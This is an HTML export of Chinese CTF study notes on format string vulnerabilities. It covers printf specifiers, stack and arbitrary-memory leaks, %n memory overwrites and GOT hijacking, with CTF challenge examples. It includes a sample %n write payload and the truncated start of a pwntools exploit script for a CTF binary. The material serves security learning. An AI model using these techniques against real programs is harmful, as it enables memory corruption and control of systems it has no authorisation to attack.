@@ -1,0 +1,710 @@
+<html>
+<head>
+<META http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+<meta content="text/css" http-equiv="Content-Style-Type">
+<title>CTF PWN16</title>
+</head>
+<body>
+<h1 align="center" class="root">
+<a name="5hpcetubrhsddjc4q54urptq57">CTF PWN16</a>
+</h1>
+<div align="center" class="globalOverview">
+<img src="CTF PWN16_files/images/CTF PWN16.jpg"></div>
+<h2 class="topic">
+<a name="1lvnauufh9k5mr5s5p23uc45ru">格式化字符串漏洞</a>
+</h2>
+<h3 class="topic">
+<a name="7njruk857haoicf691oqlc35qg">&nbsp;漏洞原理</a>
+</h3>
+<h3 class="topic">
+<a name="3kqr7ipdosas643c0u2d9sah8p">&nbsp;&nbsp;格式化字符串函数</a>
+</h3>
+<h3 class="topic">
+<a name="09501udj0repff2a1mhb23lj98">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/37coo8csbh94qd206n9367e488.png"></p>
+<h3 class="topic">
+<a name="7b7mq470sdbc6io3pqsgkghbog">&nbsp;&nbsp;常见的格式化字符串函数</a>
+</h3>
+<h3 class="topic">
+<a name="71t806ps6uq62di9aisl2a00kp">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/2qjv5alhpcb009m39lkm6qdv7s.png"></p>
+<h3 class="topic">
+<a name="4c8mm38qvk3nt8qrbkn7lt600i">&nbsp;&nbsp;格式化字符串</a>
+</h3>
+<h3 class="topic">
+<a name="2mjchi85thmgl88ujioopapv18">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/6n61ljpud8sq4oce6u5ku6i4dh.png"></p>
+<h3 class="topic">
+<a name="0cdcd9ngep7k4uejs5t862g93r">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/4pqirb4j7ejelq1jq19q756qi3.png"></p>
+<h3 class="topic">
+<a name="4cl6ef3t78fqk8npm2nca7bk8a">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/257ars9tc9ujo0otasqane72am.png"></p>
+<h3 class="topic">
+<a name="4mgpfkceu50su81radruevjg20">&nbsp;&nbsp;&nbsp;参考资料：https://blog.csdn.net/fjjjyf/article/details/84095417</a>
+</h3>
+<h3 class="topic">
+<a name="2j0ch7e0ojp1rbsp7qk4r3a4jg">&nbsp;&nbsp;&nbsp;&nbsp;C语言中格式字符串的一般形式为： &#13;
+%[标志][输出最小宽度][.精度][长度]类型， &#13;
+其中方括号[]中的项为可选项。</a>
+</h3>
+<h3 class="topic">
+<a name="33sve31i73h54aeu1pcqv4ul7k">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;类型</a>
+</h3>
+<h3 class="topic">
+<a name="53ggjs3ihjk2sequlnfk4ubl0b">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/0uau21stcnqtb7g2skjsj8596t.png"></p>
+<h3 class="topic">
+<a name="6g6kkpaf2onah4n4i3dj68jl67">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/0me0cg0nr962gcaj1j5jqekr9k.png"></p>
+<h3 class="topic">
+<a name="2dpfjisrhou16hoo1eab5lo20s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;标志</a>
+</h3>
+<h3 class="topic">
+<a name="4s0srv6ig190hafarir5abgjcp">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/7odn1ougd1atvbjfeki38msur0.png"></p>
+<h3 class="topic">
+<a name="6lf3hp0rb5rfoknei71mrhq79o">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flags 可同时出现多个，且无顺序要求。</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/2m9ul5v6dpu3k1qvesfqe7lnqb.png"></p>
+<h3 class="topic">
+<a name="2ek49qjdga1vihbm41d1vc9st6">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;输出最小宽度</a>
+</h3>
+<h3 class="topic">
+<a name="3npf88pkkb2ca5ifohl8nj8si0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/0sci4906jbb8svbd48u913odnf.png"></p>
+<h3 class="topic">
+<a name="7h0anehdmahm0j219n5q7ghq9h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/4kue61qeibk9vs756curcpnpia.png"></p>
+<h3 class="topic">
+<a name="78j9teiqiik7f2k73mj9avus3h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;精度</a>
+</h3>
+<h3 class="topic">
+<a name="0suh239s9ephi3vi1iufv658pf">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/432skj3pph0bg58h8bqqjsaetf.png"></p>
+<h3 class="topic">
+<a name="5khao4euhovjm2oe2q32ch1m86">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/6llu943vd5n1qdpibcldhhlifp.png"></p>
+<h3 class="topic">
+<a name="2n4kgqk6r4h0cu61iv6i67r2i4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;长度</a>
+</h3>
+<h3 class="topic">
+<a name="2likjrrp222a8bqo1vv98hgb89">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;结合之前关于hh h的论述，猜测hh于整数转换说明符一起使用时，是将对应的数据转换为1字节的对应数据进行输出，如果使用%hhn，是指将输出函数输出的字符数量转换为1字节范围内的数据写入指定变量；同理h表示的是转换为2字节的变量进行输出</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/27mdinb06kf9sh04ic5qldo3in.png"></p>
+<h3 class="topic">
+<a name="4m49tm7esahlidq613c850ttl2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/464mk2o951gab0mk0mmbbquhnu.png"></p>
+<h3 class="topic">
+<a name="6l3ejpd8fb67a76et2p3ni7n4s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;特殊用法</a>
+</h3>
+<h3 class="topic">
+<a name="6l70u7f086bjuig2unogqfvq03">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/43337rnl7585hfc3mmgpiaousb.png"></p>
+<h3 class="topic">
+<a name="3mrhsfldcup4thvu693v26bust">&nbsp;&nbsp;&nbsp;可以通过%n$x指定数据第几个输出函数的参数</a>
+</h3>
+<h3 class="topic">
+<a name="7pc81al8qb3jb9h14jbnv8gek2">&nbsp;&nbsp;&nbsp;可以通过field width指定要输出多长的字符串，结合%n，可以将输出的字节数写入指定内存地址中，从而达成任意地址写任意数据</a>
+</h3>
+<h3 class="topic">
+<a name="2kf7js1nngujief5rhba76ljns">&nbsp;&nbsp;格式化字符串漏洞原理</a>
+</h3>
+<h3 class="topic">
+<a name="722mbng5cmtgh0q7d8tugrkf9b">&nbsp;&nbsp;&nbsp;也可以参照之前关于0day2和漏洞战争读书笔记中的内容</a>
+</h3>
+<h3 class="topic">
+<a name="2l5ajcptljrbu1kqlth7trprd1">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/6g1s1t8ab76ekrbjht7oahqrto.png"></p>
+<h3 class="topic">
+<a name="50jl9fnsl8thurv5m4266dairb">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/3kh9i6n4387139k8dbiv49dab8.png"></p>
+<h3 class="topic">
+<a name="5d1b40dfhe0idrkil5oa4ehhdr">&nbsp;&nbsp;参考资料</a>
+</h3>
+<h3 class="topic">
+<a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2" name="0rk9vk334k7ube324edls4ufr5">&nbsp;&nbsp;&nbsp;https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2</a>
+</h3>
+<h3 class="topic">
+<a href="https://blog.csdn.net/fjjjyf/article/details/84095417" name="4krnm0t2hmbrp4q49m75sbh9r3">&nbsp;&nbsp;&nbsp;https://blog.csdn.net/fjjjyf/article/details/84095417</a>
+</h3>
+<h3 class="topic">
+<a name="56vmnlqo6b0o8k09c4sphmeude">&nbsp;漏洞利用</a>
+</h3>
+<h3 class="topic">
+<a name="2iedbd5pv5e7ta66eou3rv0fcr">&nbsp;&nbsp;栈上的格式化字符串漏洞利用</a>
+</h3>
+<h3 class="topic">
+<a name="4jsa1h5tfqfbs0tmu2rv8fhna1">&nbsp;&nbsp;&nbsp;使用格式化字符串漏洞让程序崩溃</a>
+</h3>
+<h3 class="topic">
+<a name="35i2n9boiod6krkcsn5u68abnh">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/300f4pfuuem1voptvsoud4hljk.png"></p>
+<h3 class="topic">
+<a name="3nk5dehrgcemc37uuv2209opn1">&nbsp;&nbsp;&nbsp;使用格式化字符串泄露内存</a>
+</h3>
+<h3 class="topic">
+<a name="620fg2jh001fhih0lltce0latd">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/4lvcvtkqfopfhtq6pemn3iu49s.png"></p>
+<h3 class="topic">
+<a name="6eajhnkqun78e3580biirnd1fv">&nbsp;&nbsp;&nbsp;&nbsp;泄露栈内存</a>
+</h3>
+<h3 class="topic">
+<a name="3ft7anq0j540f2pvvldmijl6ru">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/3cram78jvm1ubehlt0g6nke7bs.png"></p>
+<h3 class="topic">
+<a name="6405burq7o2kcsq2hvuhvt53f6">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;获取栈变量数值</a>
+</h3>
+<h3 class="topic">
+<a name="6lu6slr511cqug1er0cqlktqsu">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/7c2l7vkki3us31ospbclfcf08c.png"></p>
+<h3 class="topic">
+<a name="0rp0cqn80iat1i4od3nss9tpgl">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/2fe24etuaos1hqtndn2tpt9dn0.png"></p>
+<h3 class="topic">
+<a name="5101g1h7is4b7mpchkid3453jo">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以看出，此时此时已经进入了printf函数中，栈中第一个变量为返回地址，第二个变量为格式化字符串的地址，第三个变量为a的值，第四个变量为b的值，第五个变量为c的值，第六个变量为我们输入的格式化字符串对应的地址。继续运行程序</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/7ccbp4p6c0u2csjkus5i6m0c54.png"></p>
+<h3 class="topic">
+<a name="4vlfag7vj0flter08aj6kogg8k">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/6j4ldvkt7fahqee13suqicsu9j.png"></p>
+<h3 class="topic">
+<a name="4vhhhdlsqj7lbiku5j1actia0j">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/5b0kbpfjkl7pejeme3mh95st5q.png"></p>
+<h3 class="topic">
+<a name="03m7k97t2ghlkpnje8l0p20cf9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/1dsbn1msnr2g9hpl7fmhappk5i.png"></p>
+<h3 class="topic">
+<a name="3tao6dserv4br2vlfcgnqs5mp0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以通过%n$x指定数据第几个输出函数的参数</a>
+</h3>
+<h3 class="topic">
+<a name="56vjnvqapcf3sqohkqhs7m65f1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/4k46h9gia6430c8lh0pp32ppan.png"></p>
+<h3 class="topic">
+<a name="3p2rrjaj5ksdl35knn3s36mlmu">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;获取栈变量对应字符串</a>
+</h3>
+<h3 class="topic">
+<a name="16kgur8o4ijrbb1ebo23me40rq">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/4rrs88kadd0hsaoeloq1i6nv4u.png"></p>
+<h3 class="topic">
+<a name="706ed5g1p90jf3nvs0h29j4gge">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/0mmk4m176p2h94q2bc0prskg2h.png"></p>
+<h3 class="topic">
+<a name="6823c7b2gdktai53efgd6m9d5p">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;总结</a>
+</h3>
+<h3 class="topic">
+<a name="46lv3330eipgqvovkso8pdsfn0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/5krf3ogu7lcgr1di4q8s6of3fg.png"></p>
+<h3 class="topic">
+<a name="4v0517aea3ns6d8lnv2mlrpf32">&nbsp;&nbsp;&nbsp;&nbsp;泄露任意地址内存</a>
+</h3>
+<h3 class="topic">
+<a name="6gbiv6e8ud4lljmvimp4lshl1c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;即将格式化字符串作为输入时，格式化字符串一般保存在栈中，当输出函数进行输出时，会将格式化字符串的指针作为参数，如果能知道格式化字符串所存储的位置相当于输出函数的第n个参数，就可以通过在格式化字符串之前加上指定内存地址，然后将格式化字符串设置为%(n-1)$s，即可输出该内存地址中的内容</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/55kp26mapm5shq4m3gjedpo3dv.png"></p>
+<h3 class="topic">
+<a name="0sjal648qcf88ai8d44jhlmff8">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以看出在栈上的第二个变量就是我们的格式化字符串地址0xffffcd10，同时该地址存储的也确实是是"%s"格式化字符串内容。</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/7ic0rt2frhmd06lesq03gsbbun.png"></p>
+<h3 class="topic">
+<a name="7c7lkdtkspp0eevkgvv3avbog4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/3j12iu6of270le6lrsijvh3256.png"></p>
+<h3 class="topic">
+<a name="369m4dhko1n478meukn63d3r26">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/1b5547g10s6oafdahctuefpn66.png"></p>
+<h3 class="topic">
+<a name="075s56t15oqi1n6e2vkff4kmfv">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;显然0xffffcd20处所对应的格式化字符串所对应的变量值0x73243425并不能够被改程序访问，所以程序就自然崩溃了。</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/5gu6ujf77147a45a4h14048sog.png"></p>
+<h3 class="topic">
+<a name="0v06vp93tfh0ioul0h1mkgct0e">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/59e4s2g8u4fqo9mn7cgqdhirgg.png"></p>
+<h3 class="topic">
+<a name="2g818r8nrqvon3o4sitobane7i">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/2m535cn5ee1m3oeo37glve5l2u.png"></p>
+<h3 class="topic">
+<a name="0jnolb38i2fnlck2mjo8tig95f">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/08sci0ssq2vagc06gh0rg8fo09.png"></p>
+<h3 class="topic">
+<a name="1jsup4hj6c8jkvvjir7i790dni">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/54tfihsh3423qrbknbrud5eski.png"></p>
+<h3 class="topic">
+<a name="2fbafl74sc2hip7apo1pmo29od">&nbsp;&nbsp;&nbsp;&nbsp;实例</a>
+</h3>
+<h3 class="topic">
+<a name="14gv4hs42oa740h4vt7im78lhv">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;64位程序格式化字符串漏洞</a>
+</h3>
+<h3 class="topic">
+<a name="2spp8a0t69q0nb4bgmhmc1m3vp">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原理</a>
+</h3>
+<h3 class="topic">
+<a name="0mohfjfoodeqah3n49qerdecuv">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/1195r9obejuv4nr0qj2eoom1eu.png"></p>
+<h3 class="topic">
+<a name="0rj4e4sk1u6fi5i9mvd1vtuirb">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;64位linux中前六个参数的传参顺序为rdi、rsi、rdx、rcx、r8、r9</a>
+</h3>
+<h3 class="topic">
+<a name="5qklof4ga6r7c8j70lsb1i4uqe">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;UIUCTF 中 pwn200 GoodLuck</a>
+</h3>
+<h3 class="topic">
+<a name="39afeg9qrma10i0db2lpp72qqv">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;分析程序</a>
+</h3>
+<h3 class="topic">
+<a name="0mdco98tr0o74lsbl5m2sfsilf">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/2aakui7jhmsjcdie616gealbo5.png"></p>
+<h3 class="topic">
+<a name="3pua3mkmr5hb4viud17bh44igj">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;分析偏移</a>
+</h3>
+<h3 class="topic">
+<a name="4r4hada58r8t6ahgbo0io1q037">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/7rrklgbf0i8pe4lpuhshpu0l97.png"></p>
+<h3 class="topic">
+<a name="2ep6r6aogri0uun08kcq1qgo0b">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;工具 https://github.com/scwuaptx/Pwngdb 可以用于判断指定参数在输出函数中的偏移</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/06rvdj8b15u6gbert0vs2eu85a.png"></p>
+<h3 class="topic">
+<a name="78ffb3imemlepato6lgu7suv1n">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exp</a>
+</h3>
+<h3 class="topic">
+<a name="6rphmmt0vcc8opfm468k99ahah">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/03kgbe29fec3h3an5av7qb03mv.png"></p>
+<h3 class="topic">
+<a name="0e1eqj4nfgtb1rhffou9u80mnb">&nbsp;&nbsp;&nbsp;使用格式化字符串漏洞覆盖内存</a>
+</h3>
+<h3 class="topic">
+<a name="6d4oqfhsjkqcqndf4rddpo80om">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/068207p5t49oodkqsk7g3uu3g5.png"></p>
+<h3 class="topic">
+<a name="480nc7ms39b54po594mroqmvr4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过格式化字符%n能够将输出函数输出的字节数写入指定地址，前提是该内存地址可写</a>
+</h3>
+<h3 class="topic">
+<a name="3ubcjm7lhd34v352t4uvd4d3ql">&nbsp;&nbsp;&nbsp;&nbsp;覆盖栈上的数据</a>
+</h3>
+<h3 class="topic">
+<a name="089hnuclq3m9vod6gfuvt56904">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/07tlhra01mduneh69s0013vd5s.png"></p>
+<h3 class="topic">
+<a name="1o9uh1tncfud54afumf0ua8e5n">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/44p9mkrg6gr13pidjq8vnpfflb.png"></p>
+<h3 class="topic">
+<a name="4l7c2sqgcunija2asn5k3o164s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/5c0qb481jgmd3daellffqm78b7.png"></p>
+<h3 class="topic">
+<a name="5hufdigh1sgdfpbv8vobadd2gt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/4b6vdfj1f87lsq59d8tf6du75i.png"></p>
+<h3 class="topic">
+<a name="5h7o5qras21elsvmt9m2to9oek">&nbsp;&nbsp;&nbsp;&nbsp;覆盖任意地址上的数据</a>
+</h3>
+<h3 class="topic">
+<a name="011kl18d46e1tfeleujg8tmaod">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;覆盖小数据</a>
+</h3>
+<h3 class="topic">
+<a name="6g8q8mvfthbh332m1m8rts410p">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果要将一个变量赋值为一个较小的整数，则%n要求输出函数输出的字节数必须要少，如果要求将指定变量修改为2，就不能在构造payload时将目标地址放在最前面，因为该数据会被输出函数输出，导致输出字节数增加</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/216tckdjhg2fpk55f7hj1r11fq.png"></p>
+<h3 class="topic">
+<a name="6qcsfgfj0ton2l68lm81r2hj54">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/2kjnrpukl0oe2e6s9cnj3cudif.png"></p>
+<h3 class="topic">
+<a name="5h9mng799bns1vt2b3gsp3khtl">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/4kse4q70t1rk3atqaru1ht74fh.png"></p>
+<h3 class="topic">
+<a name="6cc8mg07itp6hr5kfqg7conluk">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;覆盖大数据</a>
+</h3>
+<h3 class="topic">
+<a name="1h8be2uq3aes4mrp662f32nuot">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;大致的payload格式&#13;
+p32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+'%6$n'+pad2+'%7$n'+pad3+'%8$n'+pad4+'%9$n</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/5jhq93p4bdgdn22kdqnot70fjm.png"></p>
+<h3 class="topic">
+<a name="5fldkofjfuscj5pvhfmpvlckct">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;offset表示要覆盖的地址最初的偏移&#13;
+size表示机器字长&#13;
+addr表示将要覆盖的地址。&#13;
+target表示我们要覆盖为的目的变量值。</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/448g3o2mjukbib4pqktb33j03k.png"></p>
+<h3 class="topic">
+<a name="368c8mdgd4dm4am8mqf81afspd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意当输出函数输出字节数大于想要往目标地址写入的数时，因为一次只能写入一字节，这里通过让输出字节数超过一字节表示的最大范围，从而产生溢出，进而将溢出后的较小数据写入到目标内存中</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/3hs7ks6mqjhr3fufhtj09gnfs6.png"></p>
+<h3 class="topic">
+<a name="014ia245j978jg1tmv5ojpvadu">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/20bf9aqucvn5r5enfuvhejertp.png"></p>
+<h3 class="topic">
+<a name="00eqaktpdjhivf440uraldfr00">&nbsp;&nbsp;&nbsp;hijack GOT</a>
+</h3>
+<h3 class="topic">
+<a name="6a7rmpu7310s6jq23qgs0371o8">&nbsp;&nbsp;&nbsp;&nbsp;原理</a>
+</h3>
+<h3 class="topic">
+<a name="1mqob2a1vdq4c8u2hqbim7glq6">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;即修改指定函数的GOT表项为另一个函数</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/3svp3l5cqepukucti877vh73a8.png"></p>
+<h3 class="topic">
+<a name="2b1illp71g65etekkg1oo44ecj">&nbsp;&nbsp;&nbsp;&nbsp;实例</a>
+</h3>
+<h3 class="topic">
+<a name="6pi3k7gbijacbrvl4on60a58t6">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2016 CCTF 中的 pwn3</a>
+</h3>
+<h3 class="topic">
+<a name="1q27cpv20jhh3jtn8ieefi95ae">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;保护模式与程序代码分析</a>
+</h3>
+<h3 class="topic">
+<a name="7lbr51v0gqn08ec4q0c57fju19">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/6kclkg7sbn4f0it6r25t2mi2fu.png"></p>
+<h3 class="topic">
+<a name="7sg8d9eadeqaaqp3uvt5bbce6b">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;漏洞利用思路</a>
+</h3>
+<h3 class="topic">
+<a name="1sn6bkvgrha8i87hldeb8mkp0a">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN16_files/59ap6tl7p1bm5hivqdvklbnov8.png"></p>
+<h3 class="topic">
+<a name="3arthdcb1r2690rv0sdjctrpsv">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exp</a>
+</h3>
+<h3 class="topic">
+<a name="6fa7jlbpieci3mgdt9jm0nrbop">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;from pwn import *&#13;
+from LibcSearcher import LibcSearcher&#13;
+##context.log_level = 'debug'&#13;
+pwn3 = ELF('./pwn3')&#13;
+if args['REMOTE']:&#13;
+    sh = remote('111', 111)&#13;
+else:&#13;
+    sh = process('./pwn3')&#13;
+&#13;
+&#13;
+def get(name):&#13;
+    sh.sendline('get')&#13;
+    sh.recvuntil('enter the file name you want to get:')&#13;
+    sh.sendline(name)&#13;
+    data = sh.recv()&#13;
+    return data&#13;
+&#13;
+&#13;
+def put(name, content):&#13;
+    sh.sendline('put')&#13;
+    sh.recvuntil('please enter the name of the file you want to upload:')&#13;
+    sh.sendline(name)&#13;
+    sh.recvuntil('then, enter the content:')&#13;
+    sh.sendline(content)&#13;
+&#13;
+&#13;
+def show_dir():&#13;
+    sh.sendline('dir')&#13;
+&#13;
+&#13;
+tmp = 'sysbdmin'&#13;
+name = ""&#13;
+for i in tmp:&#13;
+    name += chr(ord(i) - 1)&#13;
+&#13;
+&#13;
+## password&#13;
+def password():&#13;
+    sh.recvuntil('Name (ftp.hacker.server:Rainism):')&#13;
